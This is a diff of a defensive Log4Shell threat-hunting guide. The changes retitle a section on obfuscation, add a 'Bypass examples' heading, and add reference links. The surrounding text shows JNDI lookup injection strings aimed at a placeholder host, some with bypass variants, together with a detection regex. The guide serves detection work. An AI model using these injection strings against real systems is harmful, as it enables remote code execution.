@@ -134,7 +134,7 @@ Examples of searches are provided in Splunk's Splunk Processing Lanagage and Ela
 *Note: The above searches while less efficient than only wildcard'ing the end of the string, but they may be more effective at finding ever instance of the attack.*
 
 
-### The string blacklist bypass problem
+### The emerging obfuscations of the attack
 Quickly after this vulnerability made its way into public view, the industry began to write detections for it. Initially the most of the industry was first trying to create signatures that would match the following patterns.
 
 ${jndi:ldap://*
@@ -157,9 +157,6 @@ would be normalized to
 ${jndi:ldap://caffeinatedsheep.com/a
 ${jndi:dns://caffeinatedsheep.com/a
 ```
-
-#### Bypass examples
----------------
 
 Just as Vulnerability Scanning vendors were coming out with new packages to detect places where Log4j could be found that they had missed, Detection Vendors to were releasing new signatures to try to detect the attack when it occurred with means to bypass current detection signatures. For example, we can consider PaloAlto - a great security detection producer who created several packages related to Log4j vulnerabilities discoveries.
 
@@ -189,11 +186,15 @@ ${jndi::ldap://caffeinatedsheep.com/a}
 
 Therefore our searches must account for these bypass method. We will not only have to occasionally modify the regular expression to accommodate for these variations. I have used the following regex to attempt to find instances where bypass techniques are used.
 
-#### regex: `((?:\$\{(?:[[:alnum:]]){1,}){1,3}\:.{1,}\})`
+#### Bypass examples
+Here we look at some of the obfuscations that actively emerged during response
+**regex:** `((?:\$\{(?:[[:alnum:]]){1,}){1,3}\:.{1,}\})`
+
 
 **Note:** This regex is not sufficient to catch all forms of bypasses. You can see here  list of bypass examples that this pattern does not match against.
 
 <h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/images/regex-bypass.png" width="700px"></h1>
+[Talos Log4j Blog on Log4j: Emerging Obsfucation](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)
 
 I highly recommend reviewing [Florian Roth's yara rules on GitHub](https://github.com/Neo23x0/signature-base/blob/a383746512f1ef70999b541396bd5499a9134601/yara/expl_log4j_cve_2021_44228.yar) to preview of the strings you may want to match against, as well as some false positives to avoid.
 
@@ -349,10 +350,17 @@ While basic security efforts undertaken in most security shops apply, it should 
 
 ## Additional Resources
 [MUSA ŞANA](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
+
 [Oracle Documentation on jndi-lookup](https://docs.oracle.com/javase/7/docs/technotes/guides/jndi/jndi-ldap.html)
+
 [Frequently Asked Questions About Log4Shell](https://www.tenable.com/blog/cve-2021-44228-cve-2021-45046-cve-2021-4104-frequently-asked-questions-about-log4shell)
+
 [Picus - 4 Step Immediate Mitigation for
 Log4j Attacks (Log4Shell)](https://media-exp1.licdn.com/dms/document/C4D1FAQHAbdlMIo1zVw/feedshare-document-pdf-analyzed/0/1640074174833?e=1640908800&v=beta&t=wOeCXDhR7G8ZjvLotB1olV5SU-dIsW_cvpNAQBKq3Rw)
+
+[Talos Log4j Blog on Log4j: Emerging Obsfucation](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)
+
+[Florian Roth's yara rules on GitHub: Thor](https://github.com/Neo23x0/signature-base/blob/a383746512f1ef70999b541396bd5499a9134601/yara/expl_log4j_cve_2021_44228.yar)
 
 ## Vulnerability (CVE-2021-44228, log4shell)
 - https://logging.apache.org/log4j/2.x/security.html
